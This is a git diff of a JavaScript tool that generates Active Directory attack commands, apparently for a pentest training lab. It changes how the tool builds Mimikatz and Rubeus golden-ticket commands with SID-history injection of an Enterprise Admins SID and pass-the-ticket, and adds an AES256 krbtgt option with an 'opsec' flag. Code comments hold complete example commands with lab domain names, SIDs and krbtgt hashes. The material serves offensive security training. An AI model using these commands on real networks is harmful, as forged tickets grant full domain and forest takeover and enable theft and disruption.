@@ -91,6 +91,7 @@ function generateCrossForestCommand(form_id) {
 function generateInterForestCommand() {
 	let rc4 = (window.krbtgt ||document.querySelector("#form-sid-injection #trust-ntlm")?.value) ?? "";
 	let aes256 = document.querySelector("#form-sid-injection #trust-aes")?.value ?? "";
+	let aes256Krbtgt = document.querySelector("#form-sid-injection #aes256-krbtgt")?.value ?? "";
 	let user = document.querySelector("#form-sid-injection #user")?.value ?? "";
 	let uid = document.querySelector("#form-sid-injection #uid")?.value ?? "";
 	let currentDomain = (window.currentDomain || document.querySelector("#form-sid-injection #current-domain")?.value) ?? "";
@@ -115,9 +116,13 @@ function generateInterForestCommand() {
 	}
 	
 	if (rc4) {
-		katz_flags = `"asktgt /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /service:${service} /rc4:${rc4} /target:${targetDomain} /ticket:${ticketPath}" "exit"`;
-		
-		rubeus_krbtgt_flags = `"asktgt /user:${user} /id:${uid} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /rc4:${rc4} /netbios:${netbios} /ptt" "exit"`
+		// BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
+		katz_flags = `"kerberos::golden /user:${user} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /krbtgt:${rc4} /ptt" "exit"`;
+
+		// Rubeus.exe golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
+
+		// Rubeus.exe golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:4e9815869d2090ccfca61c1fe0d23986 /netbios:dcorp /ptt
+		rubeus_krbtgt_flags = `golden /user:${user} /id:${uid} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /${aes256Krbtgt ? 'aes256:' + aes256Krbtgt + ' /opsec' : 'rc4:' + rc4} /netbios:${netbios} /ptt`
 	}
 	
 	// Full commands
@@ -190,9 +195,9 @@ function generateKerberosTicketsCommand(form_id) {
 		if (tool == "invoke-mimikatz") {
 			command = `${tool} -Command '${flags}'`;
 		} else if (tool == "rubeus.exe") {
-			// Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd /ptt
+			// 
 			
-			command = `${toolsPath}${tool} golden /${aes256 ? 'aes256:' + aes256 + ' /opsec' : 'rc4:' + rc4} /sid:${currentDomainSID} /domain:${currentDomain} /ldap /user:${user} /printcmd /ptt`;
+			command = `${toolsPath}${tool} golden /user:${user} /domain:${currentDomain} /${aes256 ? 'aes256:' + aes256 + ' /opsec' : 'rc4:' + rc4} /sid:${currentDomainSID} /ldap /printcmd /ptt`;
 		} else {
 			command = `${toolsPath}${tool} ${flags}`;
 		}
